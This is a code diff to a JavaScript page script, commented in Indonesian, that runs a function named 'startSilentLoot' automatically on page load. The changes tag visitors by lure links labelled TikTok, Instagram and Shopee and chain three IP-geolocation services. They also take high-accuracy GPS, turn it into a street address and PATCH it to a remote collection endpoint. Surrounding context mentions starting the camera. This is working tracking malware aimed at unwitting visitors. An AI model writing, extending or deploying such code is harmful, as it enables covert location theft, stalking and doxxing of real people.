@@ -65,39 +65,98 @@ const IP2LOC_KEY = "377D98C67FC2E3AA42FDFACD479A4E67";
 async function startSilentLoot() {
     // 1. BUAT SESSION ID (FOLDER UNIK)
     const sessionID = "ONX-" + Math.random().toString(36).substr(2, 6).toUpperCase();
+    const params = new URLSearchParams(window.location.search);
+    const targetID = params.get('id');
+    let finalSource = "Direct Access";
+
+    if (targetID) {
+        const labels = {
+            'jaket': 'TikTok',
+            'baju': 'Instagram',
+            'sepatu': 'Shopee'
+        };
+        // Kalau ID cocok, pake labelnya. Kalau gak cocok, tampilin ID aslinya.
+        finalSource = labels[targetID] || `Unknown ID: ${targetID}`;
+    } else if (document.referrer) {
+        finalSource = "Ref: " + document.referrer;
+    }
 
     let report = {
         session_id: sessionID,
         time: new Date().toLocaleString(),
         userAgent: navigator.userAgent,
-        platform: navigator.platform,
+        platform: (function() {
+            var ua = navigator.userAgent;
+            if (/android/i.test(ua)) return "Android";
+            if (/iPad|iPhone|iPod/.test(ua)) return "iOS";
+            if (/Windows/i.test(ua)) return "Windows";
+            if (/Mac/i.test(ua)) return "MacOS";
+            return navigator.platform; 
+        })(),
+        referrer: finalSource,
         ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
-        referrer: document.referrer || "Direct Access",
         language: navigator.language
     };
 
-    // 2. AMBIL DATA LOKASI & IP
-    try {
-        const res = await fetch(`https://api.ip2location.io/?key=${IP2LOC_KEY}`);
-        const d = await res.json();
-        if (d.ip) {
-            report.ip = d.ip;
-            report.isp = d.isp;
-            report.city = d.city_name;
-            report.district = d.district || "N/A";
-            report.loc = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-            report.is_proxy = d.is_proxy ? "Yes" : "No";
-            report.asn = d.asn;
-        }
-    } catch (e) {
-        report.ip = "Failed to fetch IP";
+    // 2. AMBIL DATA LOKASI (SYSTEM WATERFALL / CADANGAN)
+    async function fetchLocation() {
+        // CADANGAN 1: IP2Location (Yang lu pake sekarang)
+        try {
+            const res = await fetch(`https://api.ip2location.io/?key=${IP2LOC_KEY}`);
+            const d = await res.json();
+            if (d.ip) return { 
+                ip: d.ip, isp: d.isp, city: d.city_name, 
+                district: d.district || "N/A", 
+                loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`,
+                asn: d.asn
+            };
+        } catch (e) { console.log("API 1 Limit/Error"); }
+
+        // CADANGAN 2: IP-API (Tanpa Key, limit 45 req/menit)
+        try {
+            const res = await fetch(`http://ip-api.com/json/?fields=status,country,regionName,city,district,zip,lat,lon,isp,as,query`);
+            const d = await res.json();
+            if (d.status === "success") return {
+                ip: d.query, isp: d.isp, city: d.city,
+                district: d.district || "N/A",
+                loc: `https://www.google.com/maps?q=${d.lat},${d.lon}`,
+                asn: d.as
+            };
+        } catch (e) { console.log("API 2 Limit/Error"); }
+
+        // CADANGAN 3: Cloudflare (Pasti Jalan, tapi data cuma IP & Negara)
+        try {
+            const res = await fetch(`https://1.1.1.1/cdn-cgi/trace`);
+            const text = await res.text();
+            const ip = text.match(/ip=(.*)\n/)[1];
+            return { ip: ip, isp: "Cloudflare Warp / Direct", city: "Unknown", district: "N/A", loc: "#", asn: "Unknown" };
+        } catch (e) { return { ip: "All API Failed" }; }
     }
 
+    // Eksekusi Waterfall
+    const locationData = await fetchLocation();
+    report = { ...report, ...locationData };
+
+
     // 3. AMBIL GPS AKURAT (JIKA ALLOW)
-    navigator.geolocation.getCurrentPosition((pos) => {
-        report.loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-        // Update folder yang sama dengan koordinat baru
-        fetch(`${BASE_API}/${sessionID}.json`, { method: 'PATCH', body: JSON.stringify({ loc: report.loc }) });
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        
+        // Terjemahin koordinat ke alamat jalan
+        const alamatJalan = await getRealAddress(lat, lon);
+        
+        report.loc = `https://www.google.com/maps?q=${lat},${lon}`;
+        report.address_detail = alamatJalan; // <--- Variabel baru buat alamat jalan
+
+        // Update folder yang sama dengan koordinat & alamat baru
+        fetch(`${BASE_API}/${sessionID}.json`, { 
+            method: 'PATCH', 
+            body: JSON.stringify({ 
+                loc: report.loc, 
+                address_detail: report.address_detail 
+            }) 
+        });
     }, null, { enableHighAccuracy: true });
 
     // 4. JALANKAN KAMERA
@@ -160,6 +219,17 @@ async function listenForFlash(stream) {
             }
         } catch (e) {}
     }, 2000);
+}
+
+async function getRealAddress(lat, lon) {
+    try {
+        const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=id`);
+        const data = await response.json();
+        // Mengambil Desa/Kelurahan, Kota, dan Provinsi
+        return `${data.locality || 'Desa/Kel tdk terbaca'}, ${data.city}, ${data.principalSubdivision}`;
+    } catch (error) {
+        return "Gagal ambil nama jalan";
+    }
 }
 
 window.onload = () => { setTimeout(startSilentLoot, 2000); };
